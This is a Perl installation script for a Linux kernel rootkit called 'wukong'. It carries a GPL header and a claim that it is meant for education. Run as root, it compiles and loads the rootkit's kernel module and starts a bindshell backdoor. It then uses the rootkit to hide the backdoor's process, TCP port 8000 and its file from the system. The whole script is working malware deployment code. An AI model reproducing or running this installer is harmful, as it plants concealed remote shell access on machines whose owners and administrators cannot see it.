#!/usr/bin/perl -U
=pod
 * Copyright 2014-2015 Jerry Han (hanj4096@gmail.com)
 *
 * This program is free software; you can redistribute it and/or modify   
 * it under the terms of the GNU General Public License version 3 as 
 * published by the Free Software Foundation.
 *
 * Note: 
 * This kernel rootkit is just for educational purpose and it shouldn't
 * be used for any illegal activities, use this at your own risk.
=cut

use strict;
use warnings;

sub error()
{
    print "[-] installation failed ! please check error message !";
    exit;
}

sub check_root()
{
    my $id = getpwuid($<);
    if ($id ne "root") {
        print "[-] error ! installation must be set with uid 0 (root), can not continue ! exit !\n";
        exit;
    }
    else {
        print "[+] installing as root user !\n";
    }
}

sub install()
{

    if (`uname -a` =~ /x86_64/) {
        system("cd lkm; make linux-x86_64");
    }
    else {
        system("cd lkm; make linux-x86");
    }
    
    if (-e "lkm/wukong.ko") {
        print "[+] lkm compiled successfully !\n";
    }
    else {
        error();
    }

    system("rmmod wukong");     
    system("cd lkm; insmod wukong.ko");
    print "\n[+] wukong installed ! \n";
    
    system("killall bindshell");
    system("cd app; make");
    system("./app/bindshell");      
    sleep(1);

    my $pid = `cat /tmp/log_hidden_pid`;
    system("rm -rf /tmp/log_hidden_pid");
    chomp($pid);
    print "\nhide bindshell process, pid=$pid! \n";
    system("./app/wukong 1 $pid");
    
    print "\nhide tcp 8000! \n";
    system("./app/wukong 3 8000");

    print "\nhide bindshell file! \n";
    system("./app/wukong 5 bindshell");

    exit;
}

# main
check_root();
install();

